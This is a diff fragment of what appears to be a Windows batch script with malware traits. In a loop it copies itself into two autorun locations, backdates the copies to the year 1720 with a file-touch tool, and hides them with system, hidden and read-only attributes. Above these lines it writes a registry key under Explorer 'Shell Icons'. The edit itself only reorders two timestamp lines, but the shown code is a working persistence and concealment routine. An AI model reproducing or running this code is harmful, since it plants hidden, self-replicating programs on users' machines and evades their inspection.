@@ -86,8 +86,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 :cycle
 copy /y "%~dpnx0" "%path_autoRun1%\"
 copy /y "%~dpnx0" "%path_autoRun2%\"
-%module_fileTouch% /w /a /c /d 05-25-1720 /t 22:59:59 "%path_autoRun2%\%~nx0"
 %module_fileTouch% /w /a /c /d 05-25-1720 /t 22:59:59 "%path_autoRun1%\%~nx0"
+%module_fileTouch% /w /a /c /d 05-25-1720 /t 22:59:59 "%path_autoRun2%\%~nx0"
 attrib +h +r +s "%path_autoRun1%\%~nx0"
 attrib +h +r +s "%path_autoRun2%\%~nx0"
 
